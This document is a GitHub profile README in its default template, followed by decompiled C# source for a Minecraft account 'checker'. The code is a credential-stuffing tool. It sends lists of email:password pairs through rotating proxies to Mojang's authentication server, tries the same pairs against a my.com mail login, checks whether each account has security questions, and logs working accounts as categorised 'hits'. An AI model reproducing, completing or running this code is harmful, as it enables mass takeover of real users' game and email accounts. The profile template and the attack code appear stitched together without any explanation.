- 👋 Hi, I’m @geothegemini
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
geothegemini/geothegemini is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
namespace Minecraft
{
    using Leaf.xNet;
    using MultiX.New;
    using MultiXAIO;
    using Newtonsoft.Json;
    using Newtonsoft.Json.Linq;
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Net.Security;
    using System.Runtime.CompilerServices;
    using System.Security.Cryptography.X509Certificates;
    using System.Text;

    internal class Check
    {
        private static Uri SFACheckUri = new Uri("https://api.mojang.com/user/security/challenges");
        public static int threads = 0;
        public static string proxyprotocol = "";
        public static List<string> combos;
        public static List<string> proxies1;
        public static int proxytotal = 0;
        public static int combototal = 0;
        public static int free = 0;
        public static int comboindex = 0;
        public static int cpm = 0;
        public static int cpm_aux = 0;
        public static int check = 0;
        public static int error = 0;
        public static int hit = 0;
        public static int bad = 0;
        public static int h;
        public static int m;
        public static int s;

        public static string Base64Encode(string plainText) => 
            Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

        public static bool CheckAccount(string[] s, string proxy)
        {
            int num = 0;
            while (true)
            {
                while (true)
                {
                    if (num < (SUPP.globalRetries + 1))
                    {
                        break;
                    }
                    return false;
                }
                while (true)
                {
                    try
                    {
                        using (HttpRequest request = new HttpRequest())
                        {
                            proxy = SUPP.proxies.ElementAt<string>(new Random().Next(SUPP.proxiesCount));
                            if (SUPP.proxyProtocol == "HTTP")
                            {
                                request.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (SUPP.proxyProtocol == "SOCKS4")
                            {
                                request.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (SUPP.proxyProtocol == "SOCKS5")
                            {
                                request.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0";
                            request.IgnoreProtocolErrors = true;
                            request.AllowAutoRedirect = false;
                            request.SslCertificateValidatorCallback += (obj, cert, ssl, error) => (cert as X509Certificate2).Verify();
                            string[] textArray1 = new string[] { "{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"username\": \"", s[0], "\",\"password\": \"", s[1], "\",\"requestUser\": \"true\"}" };
                            string str = request.Post("https://authserver.mojang.com/authenticate", string.Concat(textArray1), "application/json").ToString();
                            if (!str.Contains("selectedProfile"))
                            {
                                if (str.Contains("{\"error\":\"ForbiddenOperationException\",\"errorMessage\":\"Invalid credentials. Invalid username or password.\"}") || str.Contains("{\"error\":\"JsonParseException\",\"errorMessage\":\"Unexpected character "))
                                {
                                    break;
                                }
                            }
                            else
                            {
                                JObject obj2 = (JObject) JsonConvert.DeserializeObject(str);
                                string str2 = (string) obj2["selectedProfile"]["name"];
                                string token = (string) obj2["accessToken"];
                                string str4 = "NFA";
                                if (MailAccessCheck(s[0], s[1]) == "Working")
                                {
                                    str4 = "MFA";
                                }
                                else if (SFACheck(token))
                                {
                                    str4 = "SFA";
                                }
                                SUPP.hits++;
                                string[] textArray2 = new string[] { s[0], ":", s[1], " | ", str4, " - Username: ", str2 };
                                Export.AsResult("/Minecraft_hits", string.Concat(textArray2));
                                return false;
                            }
                        }
                    }
                    catch (Exception)
                    {
                        SUPP.errors++;
                    }
                }
                num++;
            }
        }

        private static string MailAccessCheck(string email, string password)
        {
            while (true)
            {
                try
                {
                    using (HttpRequest request = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(request);
                        request.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
                        string[] textArray1 = new string[] { "https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS\x00a4t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=", email, "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=", password, "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&" };
                        if (request.Get(new Uri(string.Concat(textArray1)), null).ToString().Contains("Ok=1"))
                        {
                            return "Working";
                        }
                    }
                    break;
                }
                catch
                {
                    SUPP.errors++;
                }
            }
            return "";
        }

        private static void SetBasicRequestSettingsAndProxies(HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 0x2710;
            req.KeepAliveTimeout = 0x2710;
            req.ReadWriteTimeout = 0x2710;
            char[] separator = new char[] { ':' };
            string[] strArray = SUPP.proxies.ElementAt<string>(new Random().Next(SUPP.proxiesCount)).Split(separator);
            ProxyClient client = (SUPP.proxyProtocol == "SOCKS5") ? ((ProxyClient) new Socks5ProxyClient(strArray[0], int.Parse(strArray[1]))) : ((SUPP.proxyProtocol == "SOCKS4") ? ((ProxyClient) new Socks4ProxyClient(strArray[0], int.Parse(strArray[1]))) : ((ProxyClient) new HttpProxyClient(strArray[0], int.Parse(strArray[1]))));
            if (strArray.Length == 4)
            {
                client.Username = strArray[2];
                client.Password = strArray[3];
            }
            req.Proxy = client;
        }

        public static bool SFACheck(string token)
        {
            while (true)
            {
                try
                {
                    using (HttpRequest request = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(request);
                        request.AddHeader("Authorization", "Bearer " + token);
                        if (request.Get(SFACheckUri, null).ToString() == "[]")
                        {
                            return true;
                        }
                    }
                    break;
                }
                catch
                {
                    SUPP.errors++;
                }
            }
            return false;
        }

        [Serializable, CompilerGenerated]
        private sealed class <>c
        {
            public static readonly Check.<>c <>9 = new Check.<>c();
            public static RemoteCertificateValidationCallback <>9__0_0;

            internal bool <CheckAccount>b__0_0(object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => 
                (cert as X509Certificate2).Verify();
        }
    }
}

